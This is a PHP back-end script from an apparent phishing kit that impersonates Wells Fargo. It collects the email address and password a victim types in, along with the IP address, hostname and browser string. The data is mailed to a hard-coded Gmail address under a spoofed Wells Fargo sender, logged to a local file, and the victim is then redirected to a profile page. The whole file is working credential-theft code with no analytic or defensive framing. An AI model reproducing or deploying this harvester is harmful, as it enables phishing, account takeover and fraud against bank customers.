<?php
$ip = getenv("REMOTE_ADDR");
$text_result .= "[+]===============WELLSFARGO===============\n";
$text_result .= "[+]Email address : ".$_POST['email']."\n";
$text_result .= "[+]Email Password : ".$_POST['pass']."\n";
$text_result .= "[+]===============WELLSFARGO===============\n";
$text_result .= "[+]IP address =  $ip\n";
$text_result .= "[+]host = ".gethostbyaddr($ip)."\n";
$text_result .= "[+]BROWSER = ".$_SERVER['HTTP_USER_AGENT']."\n";
$text_result .= "[+]xxxxxxxxxxxxxxxxx Mahdex999 xxxxxxxxxxxxxxxxx[+]\n";
$cc = $_POST['ccn'];
$subject = "[Wells] Email access |$ip";
$send = "mahdichakroun987@gmail.com";
$headers = "From: Wellsfargo <wells@smartpage.com> ";
mail($send,$subject,$text_result,$headers,$file);
$file = fopen("mahdex.txt", 'a');
fwrite($file, $text_result);

header("Location: ../profile.php");?>